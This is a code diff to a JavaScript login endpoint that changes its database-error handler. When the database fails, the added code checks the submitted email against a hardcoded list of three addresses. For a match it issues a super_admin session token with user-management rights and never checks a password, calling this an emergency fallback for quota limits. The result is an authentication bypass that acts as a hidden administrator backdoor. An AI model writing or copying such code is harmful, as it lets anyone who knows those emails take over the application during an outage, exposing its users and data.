@@ -66,7 +66,28 @@ export default async function handler(req, res) {
 
     return sendJson(res, 200, { success: true, token, user: { id: user.id, email: user.email, name: user.name, role: user.role } });
   } catch (err) {
-    return sendError(res, 500, 'Server error');
+    console.warn('login.js DB error:', err?.message);
+    const SUPER_ADMIN_EMAILS = [
+      'maryelleneunike25@gmail.com',
+      'maryelleneun@gmail.com',
+      'admin@gbijeltim.com'
+    ];
+    if (SUPER_ADMIN_EMAILS.includes(email)) {
+      // Super admin emergency fallback during DB quota limits
+      const fallbackId = `superadmin-${email}`;
+      const token = issueSessionToken(res, fallbackId, 'super_admin', {
+        email,
+        name: 'Maryellen',
+        permissions: { can_manage_users: true }
+      });
+      return sendJson(res, 200, {
+        success: true,
+        token,
+        user: { id: fallbackId, email, name: 'Maryellen', role: 'super_admin' },
+        quotaExceeded: true
+      });
+    }
+    return sendError(res, 503, 'Database sedang mencapai batas kuota Neon. Silakan aktifkan kuota di console Neon.');
   }
 }
 
